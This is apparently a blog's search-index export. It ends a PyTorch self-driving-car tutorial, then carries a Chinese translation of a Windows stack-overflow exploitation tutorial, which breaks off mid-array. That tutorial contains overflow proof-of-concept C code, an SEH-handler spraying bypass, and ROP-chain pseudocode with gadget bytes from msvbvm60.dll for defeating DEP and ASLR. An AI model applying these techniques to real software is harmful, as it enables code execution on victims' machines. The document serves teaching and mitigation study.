请注意一定要把测试的图片移动到result目录下，且命名为test.jpg，或修改代码中对应行。 测试结果： 而实际上这台小车正准备右转，转向值为0.244。趋势上是正确的，而效果上也是可以接受的。 3.6系统集成，自动驾驶我们现在可以使用pytorch逐帧分析图像，然后直接给出转向值用于小车控制，不再需要复杂的、分散的图像处理步骤。 只需要把上一小节的代码和之前的控制代码合并即可实现。编程能力强的同学可以留作练习。 运行auto_drive.py文件，其完整代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# 导入系统库import cv2import numpy as npimport mathimport gymimport gym_donkeycar # 导入PyTorch库from torch import nnimport torch # 导入自定义库from models import AutoDriveNetfrom utils import * def main(): &#x27;&#x27;&#x27; 主函数 &#x27;&#x27;&#x27; # 设置模拟器环境 env = gym.make(&quot;donkey-generated-roads-v0&quot;) # 设置推理环境 device = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;) # 加载训练好的模型 checkpoint = torch.load(&#x27;./results/checkpoint.pth&#x27;) model = AutoDriveNet() model = model.to(device) model.load_state_dict(checkpoint[&#x27;model&#x27;]) # 重置当前场景 obv = env.reset() # 开始启动 action = np.array([0, 0.1]) # 动作控制，第1个转向值，第2个油门值 # 执行动作并获取图像 img, reward, done, info = env.step(action) img = cv2.cvtColor(img, cv2.COLOR_RGB2HSV) # 运行5000次动作 model.eval() for t in range(5000): # 图像预处理 img = torch.from_numpy(img.copy()).float() img /= 255.0 img = img.permute(2, 0, 1) img.unsqueeze_(0) # 转移数据至设备 img = img.to(device) # 模型推理 steering_angle = 0 factor=1 with torch.no_grad(): # 计算转向角度 steering_angle = (model(img).squeeze(0).cpu().detach().numpy())[0] if steering_angle*factor&lt;-1: steering_angle=-1 elif steering_angle*factor&gt;1: steering_angle=1 else: steering_angle=steering_angle*factor print(steering_angle) action = np.array([steering_angle, 0.1]) # 油门值恒定 # 执行动作并更新图像 img, reward, done, info = env.step(action) img = cv2.cvtColor(img, cv2.COLOR_RGB2HSV) # 运行完以后重置当前场景 obv = env.reset() if __name__ == &#x27;__main__&#x27;: &#x27;&#x27;&#x27; 主函数入口 &#x27;&#x27;&#x27; main() 从视频效果上看，通过深度学习的自动驾驶小车其操控流畅性感觉上超过了它的“师傅”OpenCV版本。可能的原因在于纯粹的OpenCV图像处理方法对每帧单独处理，没有一个整体的去噪概念，容易在某一帧出现偏差。但是基于深度学习的方法更多的是学习整个数据集的操作体验，某种意义上做了一定的概率去噪，或者说是平均化，因此，整个的操控才会显得更加流畅。 到这里，这个简单的教程就结束了。恭喜你，你已经入门了end to end自动驾驶(大概)。希望我的拙见可以帮助到大家学习。","categories":[{"name":"AI","slug":"AI","permalink":"https://qianmuoy.github.io/categories/AI/"}],"tags":[]},{"title":"栈溢出","slug":"栈溢出","date":"2024-02-04T12:38:23.000Z","updated":"2024-02-04T12:40:50.892Z","comments":true,"path":"2024/02/04/栈溢出/","link":"","permalink":"https://qianmuoy.github.io/2024/02/04/%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"Windows栈溢出原文链接：Windows 内存损坏漏洞的现代探索 – 第一部分：栈溢出 (cyberark.com) 代码地址：https://github.com/forrest-orr/ExploitDev 前排提示：由于翻译的差异，“栈”与“堆栈”指的实际上是同一个东西，说的都是“stack”，然而，面向大多数刚刚接触编程的同学们，对于“堆”（heap）和“栈”的理解区分至关重要。因此，下文中应为“stack”的地方，统一称作“栈”，但难免有遗漏之处，请读者分清栈或堆栈与堆的区别，并海涵出现的疏忽。 介绍通过在现代操作系统上使用现代编译器记录自己的一些实验和研究来帮助解决过时的面向初学者的漏洞利用信息的问题。重点是Windows 10和Visual Studio 2019。 shellcodeshellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在寄存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。 shellcode可以按照攻击者执行的位置分为本地shellcode和远程shellcode。 本地shellcode本地运行的shellcode经常用于利用软件漏洞提升权限。比如在Linux下由普通权限提升至root权限。 远程shellcode利用软件漏洞获得特定的shellcode，再经由C或Python编写远程攻击程序，进而取得对方电脑的root权限。 经典栈溢出经典栈溢出是最容易理解的内存损坏漏洞。易受攻击的应用程序包含一个函数，该函数将用户控制的数据写入栈而不验证其长度。这允许攻击者： 将shellcode写入栈。 覆盖当前函数的返回地址以指向shellcode。 如果栈可以在不破坏应用程序的情况下以这种方式损坏，则shellcode将在被利用的函数返回时执行。此概念的示例如下： (经过测试，运行这段代码需要在VS中关闭编译设置中的“缓冲区安全检查（GS）”选项) （我用的vs2022，就算关闭了这个选项它依然进行了缓冲区溢出检查，老版本也许能成功，成功运行后回报的错误应该是“无效的运行地址”，而不是栈溢出。） 1234567891011121314151617181920#include&lt;Windows.h&gt;#include &lt;cstdint&gt;#include&lt;tchar.h&gt;uint8_t OverflowData[] =&#123;&quot;AAAAAAAAAAAAAAAA&quot; // 16个字节填充缓冲区&quot;BBBB&quot; // +4 字节 覆盖安全cookie&quot;CCCC&quot; // +4 字节 覆盖Ebp&quot;DDDD&quot;&#125;; // +4 字节 覆盖返回地址void Overflow(uint8_t* pInputBuf, uint32_t dwInputBufSize) &#123; char Buf[16] = &#123; 0 &#125;; memcpy(Buf, pInputBuf, dwInputBufSize);&#125;int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) &#123; _tprintf(_T(&quot;... passing %d bytes of data to vulnerable function\\r\\n&quot;), sizeof(OverflowData) - 1); Overflow(OverflowData, sizeof(OverflowData) - 1); return 0;&#125; 其中，安全cookie是一个在我们使用的栈下方加入的一个结构： 程序对cookie的值进行监测，一旦cookie中的值发生变化，则认为程序已经造成了栈溢出，立即退出程序并回报错误。如果在上一步中没有关闭，就会造成这样的结果： 栈溢出是一种技术（与字符串格式错误和堆溢出不同）仍然可以在现代Windows应用程序中利用，使用与几十年前发布的Smashing the Stack for Fun and Profit相同的方法。但是，现在适用于此类攻击的缓解措施已经非常强大了。 与字符串格式错误和堆溢出漏洞不同，对于栈溢出来说，攻击者仍然可以使用几十年前“Smashing the Stack for Fun and Profit”一文中提出的方法，来利用现代Windows应用程序中的这种漏洞。然而，现在针对这种攻击的缓解措施已经变得非常强大了。 在Windows 10上，默认情况下，使用Visual Studio 2019编译的应用程序将继承一组针对栈溢出漏洞的安全缓解措施，其中包括： SafeCRT 栈Cookie与安全的变量排序 安全的结构化异常处理（SafeSEH） 数据执行保护（DEP） 地址空间布局随机化（ASLR） 结构化异常处理覆盖保护（SEHOP） 就算让易受攻击的CRT API（如strcpy）“退休”并通过SafeCRT库引入这些API的安全版本（如strcpy_s），也无法全面解决栈溢出的问题。这是因为像memcpy这样的API仍然有效，并且这些CRT API的非POSIX变体也是如此（例如KERNEL32.DLL!lstrcpyA）。当我们试图在Visual Studio 2019中编译包含这些“被退休”的API的应用程序时，会触发严重的编译错误，尽管这些错误是可抑制的。 栈Cookie是试图“修复”和防止栈溢出漏洞在运行时被利用的第一道防护机制。SafeSEH和SEHOP是在栈Cookie外围工作的两种缓解措复施，而DEP和ASLR并不是针对栈的缓解方法，因为它们并不能防止栈溢出攻击或EIP劫持的发生。相反，它们的作用提高通过这种攻击执行shellcode的难度。所有这些缓解措施都将随着本文的推进而深入探讨。下一节将重点讨论栈Cookie——目前我们在尝试利用栈溢出时的主要对手。 栈Cookie、GS与GS++随着Visual Studio 2003的发布，微软在其MSVC编译器中加入了一个新的栈溢出防御功能，称为GS。两年后，他们在发布Visual Studio 2005时默认启用了该功能。 关于GS，网上的信息虽然非常丰富，但是大部分都是过时的和&#x2F;或不完整的信息。之所以出现这种情况，是因为GS的安全缓解措施自最初发布以来已经发生了重大的变化：在Visual Studio 2010中，一个名为GS++的增强版GS取代了原来的GS功能。令人困惑的是，微软从未更新其编译器选项的名称，尽管实际上是GS++，但至今仍是“&#x2F;GS”。 从根本上说，GS其实是一种安全缓解措施，它被编译进二进制级别的程序，在包含Microsoft所谓的“GS缓冲区”（易受栈溢出攻击的缓冲区）的函数中放置策略性栈损坏检查（借助于栈Cookie）。最初的GS只考虑包含8个或更多元素，元素大小为1或2（字符和宽字符）字节的数组作为GS缓冲区，而GS++对此定义进行了实质性扩展，包括： 任何数组(无论长度或元素大小) 结构体(无论其内容是什么) 这个增强技术对现代栈溢出漏洞有很大的意义，因为它基本上使所有容易受到栈溢出攻击的函数免于受到基于返回地址的EIP劫持技术的影响。这反过来又会对其他陈旧的利用技术产生影响，比如通过部分EIP覆盖来绕过ASLR的技术——2007年著名的Vista CVE-2007-0038 Animated Cursor漏洞就利用结构溢出而流行起来的。随着2010年GS++的出现，在典型的栈溢出情况下，部分EIP覆盖作为ASLR绕过的方法已经失效。 MSDN上关于GS的信息（最后一次更新是在四年前的2016年），在GS覆盖率方面，与我自己的一些测试结果是相矛盾的。例如，微软将以下变量列为非GS缓冲区的例子： 123456789char *pBuf[20];void *pv[20];char buf[4];int buf[2];struct &#123; int a; int b; &#125;; 然而在我自己使用VS2019进行的测试中，这些变量都会导致栈Cookie的产生。这说明GS确实被升级为了GS++，且作用域为上述的任何数组(无论长度或元素大小)、结构体(无论其内容是什么)。 究竟什么是栈Cookie，它们是如何工作的？ 栈Cookie在Visual Studio 2019中是默认设置的。它们可以使用&#x2F;GS标志进行配置，我们可以在项目设置的 Project -&gt; Properties -&gt; C&#x2F;C++ -&gt; Code Generation -&gt; Security Check字段中设置该标志。 当加载了一个用&#x2F;GS编译的PE时，它会初始化一个新的随机栈Cookie种子值，并将其作为一个全局变量存储在其.data段中。 每当一个包含GS缓冲区的函数被调用时，它都会将这个栈Cookie种子与EBP寄存器进行XOR运算，并将其存储在保存的EBP寄存器和返回地址之前的栈上。 在受保护的函数返回之前，它会再次用&gt;EBP对其保存的伪唯一性栈Cookie进行XOR运算，以获得原始的栈Cookie种子值，并进行相应的检查，以确保它仍然与存储在.data段的种子相匹配。 如果这个值不匹配，应用程序会抛出一个安全异常并终止执行。 由于攻击者不可能在覆盖返回地址的同时不覆盖函数栈帧中保存的栈Cookie，这种机制能够阻止栈溢出漏洞利用代码通过RET指令劫持EIP，从而达到任意执行代码的目的。 在现代编译环境中编译并执行之前的栈溢出项目，会出现STATUS_STACK_BUFFER_OVERRUN异常(代码0xC0000409)；使用调试器可以逐步剖析其出错原因。 我们可以看到，一顿开栈操作后，创建了一个位于0x057a028的安全栈cookie，并将这个地址里面的内容压入栈。这个内容正好占用的是四个字节。 在memcpy函数返回之后，我们可以看到栈确实被我们的预期数据破坏了，其中包括返回地址EDX，现在已经变为0x44444444。在过去，当这个函数返回时，会出现访问冲突异常，并断言0x44444444是一个要执行的无效地址。但是，栈Cookie安全检查将阻止这种情况。 首次执行该函数时，如果将存储在.data段中的栈Cookie种子与EBP进行XOR运算，然后将其保存到栈中。由于这个值在溢出期间将被值0x42424242所覆盖（如果我们希望能够覆盖返回地址并劫持EIP，这是不可避免的），从而生成有毒的栈Cookie值，即0xa33d2a88（在ECX中可以清楚看到），现在，该值将被传递给内部函数__security_check_Cookie进行验证。 一旦这个函数被调用，就会导致STATUS_STACK_BUFFER_OVERRUN异常（代码0xC0000409）。这虽然会导致进程崩溃，但也防止了攻击者成功利用该漏洞。 当您熟悉这些概念和实际例子后，会注意到关于栈Cookie的几个“有趣”的事情： 它们不能防止栈溢出的发生。攻击者仍然可以随心所欲地在栈上覆盖任意数量的数据。 它们只是针对每个函数的伪随机值。这意味着，如果.data中的栈Cookie种子发生内存泄漏，同时栈指针也发生泄漏，攻击者就可以准确地预测Cookie，并将其嵌入到其溢出中以绕过安全异常。 从根本上来说（假设它们无法通过内存泄漏进行预测），栈Cookie只能防止我们通过易受攻击的函数的返回地址来劫持EIP。这意味着我们仍然可以以任何方式破坏栈，并能够在安全检查和RET指令之前执行任意代码。那么，这在现代栈溢出的可靠利用过程中有什么价值呢？ SSH劫持进程中的每个线程都可以注册handler函数（默认情况下也是如此），以便在触发异常时进行调用。这些handler函数的指针通常存储在栈上的EXCEPTION_REGISTRATION_RECORD结构体中。在任何版本的Windows上启动一个32位应用程序时，都至少会注册一个这样的handler，并将相关数据存储在栈中，具体如下图所示： (VS找不到，IDA也没有这个关键字，只能用别人的图了) 上面高亮显示的EXCEPTION_REGISTRATION_RECORD结构体包含一个指向下一个SEH记录的指针（也存储在栈上），后面是指向handler函数的指针（在本例中是NTDLL.DLL库中的函数）。 1234567typedef struct _EXCEPTION_REGISTRATION_RECORD &#123;PEXCEPTION_REGISTRATION_RECORD Next;PEXCEPTION_DISPOSITION Handler;&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD; 在内部，指向SEH handler列表的指针都存储在每个线程的TEB的偏移量0处，并且每个EXCEPTION_REGISTION_RECORD都链接到下一个。如果handler不能正确处理抛出的异常，它会将执行权移交给下一个handler，以此类推。 因此，SEH实际上为攻击者提供了绕过栈Cookie的理想方法。我们可以利用栈溢出，覆盖现有的SHE handler(肯定至少会有一个)，然后让应用程序崩溃(考虑到我们有能力破坏栈内存，这肯定不在话下)。这将导致在易受攻击函数最后调用__SECURITY_CHECK_COOKIE之前，EIP被重定向到EXCEPTION_REGISTION_RECORD结构体中被覆盖后的handler地址。因此，在执行shellcode之前，应用程序根本没有机会发现其栈已被破坏。因此，我们可以用自定义的SEH handler喷射栈，覆盖现有的EXCEPTION_REGISTRATION_RECORD结构体。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include&lt;Windows.h&gt;#include &lt;cstdint&gt;#include&lt;tchar.h&gt;void Overflow(uint8_t* pInputBuf, uint32_t dwInputBufSize) &#123; char Buf[16] = &#123; 0 &#125;; memcpy(Buf, pInputBuf, dwInputBufSize);&#125;EXCEPTION_DISPOSITION __cdecl FakeHandler(EXCEPTION_RECORD* pExceptionRecord, void* pEstablisherFrame, CONTEXT* pContextRecord, void* pDispatcherContext) &#123; _tprintf(_T(&quot;... fake exception handler executed at 0x%p\\r\\n&quot;), FakeHandler); system(&quot;pause&quot;); return ExceptionContinueExecution;&#125;int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) &#123; uint32_t dwOverflowSize = 0x20000; uint8_t* pOverflowBuf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, dwOverflowSize); _tprintf(_T(&quot;... spraying %d copies of fake exception handler at 0x%p to the stack...\\r\\n&quot;), dwOverflowSize / 4, FakeHandler); for (uint32_t dwOffset = 0; dwOffset &lt; dwOverflowSize; dwOffset += 4) &#123; *(uint32_t*)&amp;pOverflowBuf[dwOffset] = *(uint32_t*)FakeHandler; &#125; _tprintf(_T(&quot;... passing %d bytes of data to vulnerable function\\r\\n&quot;), dwOverflowSize); Overflow(pOverflowBuf, dwOverflowSize); return 0;&#125; 我们得到的不是EXE中FakeHandler函数上的断点，而是得到一个STATUS_INVALID_EXCEPTION_HANDLER异常(代码0xC00001A5)。这是一个源于SafeSEH的安全缓解异常。SafeSEH是一个安全缓解措施，仅适用于32位PE文件。在64位PE文件中，一个名为IMAGE_DIRECTORY_ENTRY_EXCEPTION的永久性（非可选）数据目录取代了原来在32位PE文件中的IMAGE_DIRECTORY_ENTRY_RIGHT数据目录。SafeSEH与GS特性都是在Visual Studio 2003版本中发布的，随后在Visual Studio 2005版本中成为了默认设置。 什么是SafeSEH，它是如何工作的？ 在Visual Studio 2019中，SafeSEH是默认设置的。它通过使用&#x2F;SAFESEH标志进行配置，我们可以在Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Image Has Safe Exception Handlers中进行相应的设置。 SafeSEH编译的PE文件含有一个有效的SEH handler地址列表，位于名为SEHandlerTable的表中，我们可以在其IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中指定。 每当触发异常时，在执行EXCEPTION_REGISTRATION_RECORD链表中的每个handler的地址之前，Windows会检查该handler是否位于映像内存的范围内（表明它与加载的模块有关），如果是的话，就会用它的SEHandlerTable检查这个handler地址对有关模块是否有效。 在上图中，我们是通过栈溢出的方式来注册handler的，通过这种方式创建的handler是无法被编译器所识别的（因此，也不会添加到SEHandlerTable中）。通常情况下，编译器会将作为__try __except语句的副作用而创建的handler添加到这个表中。在禁用SafeSEH后，再次运行这段代码会导致栈溢出，执行被喷入的handler。 下图所示为栈溢出，导致执行了伪造的SEH handler，该handler被编译为PE EXE映像的主映像。 当然，虽然自2005年以来Visual Studio就默认启用了SafeSEH，但是，在现代应用程序中是否仍然存在禁用了SafeSEH的已加载PE代码呢？在自己探索这个问题的时候，我写了一个PE文件扫描工具，以便在系统范围内检测每个文件是否存在（或缺乏）漏洞缓解措施。当我使用这个扫描工具处理我的Windows 10虚拟机上的SysWOW64文件夹（并对非SafeSEH PEs进行过滤）后，结果令人大跌眼镜。 看来，微软本身也有相当多的非SafeSEH PE，特别是至今仍在随Windows10一起提供的DLL。扫描我的Program Files文件夹后，得到的结果则更有说服力，大约有7%的PE文件缺乏SafeSEH保护。事实上，尽管我的虚拟机上安装的第三方应用程序很少，但从7-zip、Sublime Text到VMWare Tools，几乎每个应用程序都至少含有一个非SafeSEH模块。即使在进程的地址空间中只有一个这样的模块，也足以绕过其栈Cookie缓解措施，进而使用本文中探讨的技术利用栈溢出漏洞。 值得注意的是，在如下所示两种不同的情况下，SafeSEH可以被认为对PE生效的，它们是我的工具在扫描中使用的标准： 在IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG数据目录中存在上述的SEHandlerTable以及SEHandlerCount大于零的情况。 IMAGE_DLLCHARACTERISTICS_NO_SEH标志被设置在IMAGE_OPTIONAL_HEADER.DllCharacteristics的header字段。 假设一个没有采用SafeSEH措施的模块被加载到一个易受攻击的应用程序中，对于exploit编写者来说，仍然还面临令一个重要的障碍。回到图10，尽管一个伪造的SEH HANDLER通过栈溢出被成功执行，但是这个handler被编译到了PE EXE映像本身中。所以，为了实现任意代码执行，我们需要执行一个存储在栈上的伪造SEH HANDLER（一个shellcode）。 DEP &amp; ASLR由于存在DEP和ASLR防御机制，在栈上将我们的shellcode用作伪异常handler存在多个障碍： 由于存在ASLR机制，我们不知道Shellcode在栈上的地址，因此无法将其嵌入到我们的溢出内容中以喷射到栈中。 由于存在DEP机制，在默认情况下，栈本身以及扩展的shellcode是不可执行的。 随着2004年Windows XP SP2的问世，DEP首次在Windows世界得到了广泛的采用，并且从那时起，DEP已经成为当今使用的几乎所有现代应用程序和操作系统的普遍特性。它是通过使用硬件层内存页的PTE头部中的一个特殊位（NX，也就是不可执行位）来实现的，默认情况下，该位将在Windows中所有新分配的内存上被设置。这意味着攻击者必须显式创建可执行内存区域，方法是通过诸如KERNEL32.DLL!VirtualAlloc之类的API分配具有可执行权限的新内存，或者通过使用诸如KERNEL32.DLL!VirtualProtect之类的API将现有的非可执行内存修改为可执行的。这样做的一个副作用是，由于栈和堆在默认情况下都是不可执行的，因此，我们无法直接从这些位置执行shellcode，换句话说，我们必须首先为它开辟一个可执行的内存区域。 从exploit编写的角度来看，理解DEP的关键在于，DEP是一种要么全有要么全无的缓解措施：要么应用于进程内的所有内存，要么不应用于进程内的所有内存。如果使用&#x2F;NXCOMPAT标志编译生成进程的主EXE，则整个进程将启用DEP。与诸如SafeSEH或ASLR之类的缓解措施形成鲜明对比的是，并不存在非DEP DLL模块之类的东西。 从exploit编写的角度来看，DEP的解决方案早已被理解为面向返回的编程（ROP）。原则上，现有的可执行内存将与攻击者提供的栈一起以小片段的形式回收，以实现为我们的shellcode划分可执行区域的目标。创建自己的ROP链时，我选择使用KERNEL32.DLL!VirtualProtect API，以便使存放shellcode的栈区域是可执行的。该API的原型如下所示： 1234567891011BOOL VirtualProtect(LPVOID lpAddress,SIZE_T dwSize,DWORDflNewProtect,PDWORD lpflOldProtect); 在ASLR问世之前，如果可以通过溢出来控制栈，就可以将这五个参数作为常量植入栈，然后触发一个EIP重定向，使其指向KERNEL32.DLL中的VirtualProtect函数（其基地址是静态的）。在这里，唯一的障碍是——我们不知道作为第一个参数传递或作为返回地址使用的shellcode的确切地址。后来，攻击者利用NOP sledding技术（在shellcode的前面填充一大段NOP指令，即0x90）解决了这个问题。然后，exploit编写者可以推断出shellcode在栈中的大致区域，并在这个范围内选取一个地址并将其直接植入溢出内容中，从而通过NOP sled将这个猜测转化为精确的代码执行。 随着2006年Windows Vista中ASLR的出现，ROP链的创建变得有些棘手，因为现在： DLL的基址和VirtualProtect的基址变得不可预测。 shellcode的地址难以猜测。 包含可执行代码片段的模块的地址变得不可预测。 这不仅对ROP链提出了更多的要求，同时，还要求其实现要更加精确，因此，NOP sled（1996年左右的经典形式）成为ASLR时代的牺牲品。这也导致了ASLR绕过技术成为了DEP绕过技术的前提条件。如果不绕过ASLR，从而至少定位含有漏洞的进程中一个模块的基地址，就无法知道ROP Gadget的地址，从而无法执行ROP链，也就无法调用VirtualProtect函数来绕过DEP。 要创建一个现代的ROP链，我们首先需要这样一个模块：我们可以在运行时预测其基地址的模块。在大多数现代漏洞利用技术中，这是通过使用内存泄漏漏洞来实现的（这个主题将在本系列的字符串格式错误和堆损坏续集中加以探讨）。为了简单起见，我选择在易受攻击进程的地址空间中引入一个非ASLR模块（来自我的Windows 10虚拟机的SysWOW64目录）。在继续之前，必须了解非ASLR模块背后的概念（以及在exploit编写过程中的作用）。 从exploit编写的角度来看，以下是我认为最有价值的ASLR概念： 在Visual Studio 2019中，ASLR是默认设置的。它使用&#x2F;DYNAMICBASE标志进行配置，我们可以在项目设置的Project -&gt; Properties -&gt; Linker -&gt; Advanced -&gt; Randomized Base Address字段中进行配置。 当使用该标志编译PE文件时，它（在默认情况下）总是导致创建一个IMAGE_DIRECTORY_ENTRY_BASERELOC数据目录（存储在PE文件的.reloc段中）。如果没有这些重定位信息，Windows就无法重建模块的基地址并执行ASLR。 编译后的PE将在其IMAGE_OPTIONAL_HEADER.DllCharacteristics头部中设置IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志。 当PE被加载时，将为其选择一个随机的基地址，并且其代码&#x2F;数据中的所有绝对地址都将使用重定位部分进行重定位。这个随机地址在每次启动时都是不同的。 如果用于启动进程的主PE(EXE)启用了ASLR，也会导致栈和堆被随机化。 您可能会注意到，这实际上会导致两种不同的情况，其中可能会出现非ASLR模块。第一种情况是显式编译模块以排除ASLR标志(或在该标志存在之前编译)，第二种情况是设置了ASLR标志，但由于缺少重新定位而无法应用。 开发人员的一个常见错误是，在他们的编译器中联合使用ASLR标志和“strip relocations”选项，他们认为这样生成的二进制文件是受ASLR保护的，而实际上它仍然是易受攻击的。从历史上看，非ASLR模块非常常见，甚至在Windows7+ Web浏览器攻击中被滥用，并在商业恶意软件中大获成功。现在，这类模块已经逐渐变得稀缺，这在很大程度上是因为ASLR已经成为诸如Visual Studio之类的IDE中默认启用的一种安全缓解措施。令人惊讶的是，我的扫描软件在我的Windows10虚拟机上发现了大量非ASLR模块，许多位于在System32和SysWOW64目录中。 值得注意的是，图12中显示的所有非ASLR模块都具有非常不同（且唯一）的基地址。这些都是Microsoft编译的PE文件，其本意就是不使用ASLR，之所以这么做，很可能是出于性能或兼容性的原因。它们将始终加载到image_optional_header.imageBase中指定的映像基地址处（上图中突出显示的值）。显然，这些独特的映像基地址是编译器在创建时随机选择的。通常情况下，PE文件都会在其PE头部中包含默认映像基地址值，如0x00400000（用于EXE）和0x1000000（用于DLL）。这种专门创建的非ASLR模块与因失误而创建的非ASLR模块（如下图所示）形成了鲜明的对比。 这是在最新版本的HXD Hex Editor中作为重定位剥离(不知情的开发人员的旧优化习惯)副作用而创建的非ASLR模块的一个主要例子。值得注意的是，您可以在上面的图13中看到，与图12中的模块(具有随机基地址)不同，这些模块都具有相同的默认映像基地址0x00400000（已经被编译到它们的PE头部中）。这与其PE头部中存在的IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE标志相结合，表明编译它们的开发人员假设它们将使用随机地址进行加载，而不是在0x00400000处进行加载，并认为它们会受到ASLR机制的保护。然而，在实践中，我们可以肯定它们总是被加载到地址0x00400000处，尽管已经启用了ASLR——因为在没有重新定位数据的情况下，操作系统是无法在初始化期间重新设置它们的基地址的。 通过回收非ASLR模块的可执行段(通常是它们的.text段)中的代码，我们能够构造相应的ROP链来调用KERNEL32.DLL!VirtualProtect API，并为栈上shellcode禁用DEP保护机制。 在图12中可以看出，我选择了SysWOW64中的非ASLR模块msvbvm60.dll作为ROP链，因为它不仅缺少ASLR保护，而且还缺少SafeSEH(考虑到我们必须知道在溢出时写入栈的伪造SEH handler&#x2F;stack pivot gadget的地址，这是一个至关重要的细节)。此外，这里还通过IAT导入了KERNEL32.DLL!VirtualProtect，这一细节极大地简化了ROP链的创建过程。 创建ROP链第一步，我使用Ropper从msvbvm60.dll中提取所有可能有用的可执行代码片段（以RET、JMP或CALL指令结束）。实际上，我创建ROP链有三个主要意图： 通过从msvbvm60.dll的IAT加载其地址来调用KERNEL32.DLL!VirtualProtect（以绕过KERNEL32.DLL的ASLR）。 动态控制VirtualProtect的第一个参数，使其指向栈上的shellcode（以绕过DEP）。 人为控制VirtualProtect的返回地址，令其返回时，动态地执行栈上的shellcode（现在的权限是+RWX）。 在编写ROP链的时候，我先用汇编语言描述所需逻辑的伪代码，然后，设法用ROP Gadget来复现该逻辑。 下为ROP链的伪代码逻辑 1234567891011Gadget #1 | MOV REG1, &lt;Address of VirtualProtect IAT thunk&gt; ; RETGadget #2 | MOV REG2, &lt;Address of JMP ESP - Gadget #6&gt; ; RETGadget #3 | MOV REG3, &lt;Address of gadget #5&gt; ; RETGadget #4 | PUSH ESP ; PUSH REG3 ; RETGadget #5 | PUSH REG2 ; JMP DWORD [REG1]Gadget #6 | JMP ESP 值得注意的是，在上面精心构造的的逻辑中，使用了msvbvm60.dll中一个包含VirtualProtect地址的解除引用的IAT thunk地址，以解决KERNEL32.DLL的ASLR问题。Windows在加载msvbvm60.dll时，会为我们解析VirtualProtect的地址，并且这个地址将始终保存在msvbvm60.dll内的同一位置处。这里，我打算使用JMP指令来调用它，而不是CALL指令。这是因为我需要为调用VirtualProtect创建一个伪造的返回地址，这个返回地址将导致shellcode（现在已经摆脱了DEP）直接执行。这个伪造的返回地址会指向一个JMP ESP gadget。我这么做的理由是：尽管不知道（也无法知道）通过溢出写入栈中的shellcode的具体位置，但该gadget返回后，ESP会指向ROP链的末端，而我可以精心构造溢出内容，使shellcode正好位于这个ROP链后面。 此外，我在第4个gadget中也使用了同样的技术：通过两个push指令让ESP动态生成VirtualProtect的第一个参数。与JMP ESP指令不同（其中ESP会直接指向我的shellcode），这里的ESP会与我的shellcode的地址略有偏差（运行时ESP与ROP链末端的距离）。这并不是一个问题，因为充其量只是在ROP链的末端除了shellcode本身之外，还将禁用DEP。 在构建ROP链的过程中（也就是将上述逻辑付诸实施过程中），我发现gadget #4（我的伪代码gadget中最稀有和最不可替代的一个）没有出现在msvbvm60.dll中。这个挫折是一个很好的例子，说明了为什么在任何公共漏洞利用代码中几乎每个ROP链都在使用PUSHAD指令，而不是类似于我所描述的伪代码逻辑。 简而言之，PUSHAD指令允许exploit编写者动态地将ESP的值（以及栈上的shellcode）与所有其他相关的KERNEL32.DLL!VirtualProtect参数一起放到栈上，而无需使用任何罕见的gadget。他们所有需要做的就是正确填充每个通用寄存器的值，然后执行PUSHAD ; RET gadget来完成攻击。关于这方面的详细介绍，请访问Corelan撰写的“ Exploit writing tutorial part 10 : Chaining DEP with ROP – the Rubik’s[TM] Cube”一文。最终，我们的ROP链需要通过如下方式设置相关的寄存器： 12345678910111213EAX = NOP sledECX = Old protection (writable address)EDX = PAGE_EXECUTE_READWRITEEBX = SizeEBP = VirtualProtect return address (JMP ESP)ESI = KERNEL32.DLL!VirtualProtectEDI = ROPNOP 在实践中，上面的逻辑可以被ROP gadget替换，具体如下面的伪码所示： 123456789101112131415161718192021Gadget #1: MOV EAX, &lt;msvbvm60.dll!VirtualProtect&gt;Gadget #2: MOV ESI, DWORD [ESI]Gadget #3: MOV EAX, 0x90909090Gadget #4: MOV ECX, &lt;msvbvm60.dll!.data&gt;Gadget #5: MOV EDX, 0x40Gadget #6: MOV EBX, 0x2000Gadget #7: MOV EBP,Gadget #8: MOV EDI,Gadget #9: PUSHADGadget #10: ROPNOPGadget #11: JMP ESP 上面的伪码逻辑最终可以转换为来自msvbvm60.dll的ROP链数据，具体如下所示： 1234567891011121314151617181920212223242526272829303132333435363738394041uint8_t RopChain[] =&quot;\\x54\\x1e\\x00\\x66&quot; // 0x66001e54 | Gadget #1 | POP ESI ; RET&quot;\\xd0\\x10\\x00\\x66&quot; // 0x660010d0 -&gt; ESI | &lt;msvbvm60.dll!VirtualProtect thunk&gt;&quot;\\xfc\\x50\\x05\\x66&quot; // 0x660550fc | Gadget #2 | MOV EAX, DWORD [ESI] ; POP ESI; RET&quot;\\xef\\xbe\\xad\\xde&quot; // Junk&quot;\\xf8\\x9f\\x0f\\x66&quot; // 0x660f9ff8 | Gadget #3 | XCHG EAX, ESI; RET&quot;\\x1f\\x98\\x0e\\x66&quot; // 0x660e981f | Gadget #4 | POP EAX; RET&quot;\\x90\\x90\\x90\\x90&quot; // NOP sled -&gt; EAX | JMP ESP will point here&quot;\\xf0\\x1d\\x00\\x66&quot; // 0x66001df0 | Gadget #5 | POP EBP; RET&quot;\\xea\\xcb\\x01\\x66&quot; // 0x6601CBEA -&gt; EBP |&quot;\\x10\\x1f\\x00\\x66&quot; // 0x66001f10 | Gadget #6 | POP EBX; RET&quot;\\x00\\x20\\x00\\x00&quot; // 0x2000 -&gt; EBX | VirtualProtect() | Param #2 | dwSize&quot;\\x21\\x44\\x06\\x66&quot; // 0x66064421 | Gadget #7 | POP EDX; RET&quot;\\x40\\x00\\x00\\x00&quot; 